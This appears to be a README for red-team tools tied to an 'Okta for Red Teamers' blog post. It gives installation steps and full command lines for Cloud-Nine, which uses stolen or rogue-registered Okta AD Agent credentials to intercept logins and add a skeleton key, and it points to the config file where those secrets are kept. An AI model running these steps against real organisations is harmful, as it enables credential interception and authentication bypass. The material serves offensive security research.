## Info

This repo contains projects to support the "Okta for Red Teamers" blog post [here](https://blog.xpnsec.com/okta-for-redteamers/).

## Cloud-Nine

An Okta Agent tool which emulates an AD Agent, allows interception of authentication requests, and adding a skeleton key.

### Installation

```
python3 -m venv env
source ./env/bin/activate
pip install -r requirements.txt
```

### Usage

Three modes are supported:

1. Use a stolen AD Agent token (agent version < 3.18.0) to connect to Okta and intercept authentication requests:

```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 0023452Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```

2. Use a stolen AD Agent key (agent version >= 3.18.0) to connect to Okta and intercept authentication requests:

```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 key --app-id 0o[...]7 --agent-id a5[...]7 --client-id wl[...]7 --agent-key '{"d":"LA[...]=","p":"1r[...]=","q":"xm[...]=","dp":"eo[...]=","dq":"Pr[...]=","qp":"Ae[...]=","n":"pm[...]=","e":"AQAB"}'
```

The `AppId`, `AgentId`, `ClientId` and `AgentKey` parameters can be found in the `OktaAgentService.exe.config` file. The `AgentKey` setting is, like the `AgentToken` in older versions, protected with the DPAPI master key of the account running the Okta AD Agent service.

3. Register a new AD Agent with Okta and intercept authentication requests:

> Note: You'll need an OAuth Response Code which you can get from:

```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```

Then we can pass this as an arg to:

```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```

## OktaRealFast

This is a proxy tool for validating Okta FastPass JWT's before forwarding them to a target host.

The idea is simple.. it gives the ability to see if a popup is going to be presented to the user during post-exploitation. 

More information in the blog post https://blog.xpnsec.com/identity-providers-redteamers.

## malIDP

This has been moved to its own repository at [https://github.com/xpn/malIDP](https://github.com/xpn/malIDP).

